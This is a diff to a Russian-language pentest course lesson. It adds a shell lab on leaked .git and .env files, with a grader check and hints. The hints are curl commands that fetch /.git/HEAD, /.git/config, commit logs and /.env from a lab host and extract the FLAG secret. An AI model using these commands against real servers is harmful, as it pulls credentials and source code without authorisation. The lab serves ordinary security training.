@@ -13,6 +13,19 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 45
 summary: "Самая высокорентабельная разведка: восстановление исходников из .git, чтение .env, бэкапы и конфиги — креды и секреты."
+lab:
+  kind: shell
+  title: "Практика: утечка .git и .env"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Проверь служебный файл: `curl -s -i http://app.lab.local/.git/HEAD` — `200` значит каталог отдаётся.
+    - Посмотри конфиг репозитория: `curl -s http://app.lab.local/.git/config`.
+    - В истории коммитов (`/.git/logs/HEAD`) видно «remove hardcoded credentials» — секрет удаляли, но след остался.
+    - Главный приз — в `.env`: `curl -s http://app.lab.local/.env` (там строка `FLAG=`).
+    - Достань значение: `curl -s http://app.lab.local/.env | grep FLAG | cut -d= -f2 > found.txt`, затем `check`.
 ---
 
 ## Вопрос, с которого всё начинается
